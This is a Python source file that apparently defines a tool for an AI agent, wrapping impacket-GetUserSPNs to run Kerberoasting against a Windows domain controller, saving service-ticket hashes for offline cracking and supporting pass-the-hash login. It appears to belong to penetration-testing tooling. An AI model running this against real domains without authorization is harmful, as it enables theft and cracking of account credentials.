from __future__ import annotations
from typing import Any

from backend.agent.tools.base import BaseTool, ToolResult, OnOutputCallback
from backend.agent.tools import executor


class ImpacketGetUserSPNsTool(BaseTool):
    name = "run_getuserspns"
    description = (
        "Run impacket-GetUserSPNs to perform Kerberoasting. "
        "Requests service tickets for accounts with SPNs registered and extracts crackable hashes. "
        "Requires valid domain credentials. Crack the resulting hashes offline."
    )
    parameters = {
        "type": "object",
        "properties": {
            "target": {
                "type": "string",
                "description": "DOMAIN/username:password@DC_IP e.g. 'corp.local/user:pass@10.0.0.1'",
            },
            "request": {
                "type": "boolean",
                "description": "Request service tickets and output hashes (required for cracking)",
            },
            "output_file": {
                "type": "string",
                "description": "Save hashes to this file e.g. /tmp/kerberoast_hashes.txt",
            },
            "hash": {
                "type": "string",
                "description": "NTLM hash for pass-the-hash authentication",
            },
        },
        "required": ["target"],
    }

    async def run(
        self,
        on_output: OnOutputCallback,
        target: str,
        request: bool = True,
        output_file: str = "/tmp/kerberoast_hashes.txt",
        hash: str | None = None,
        **_: Any,
    ) -> ToolResult:
        args = ["impacket-GetUserSPNs", target, "-outputfile", output_file]
        if request:
            args.append("-request")
        if hash:
            args += ["-hashes", hash]
        return await executor.execute(self.name, args, on_output, timeout=120)
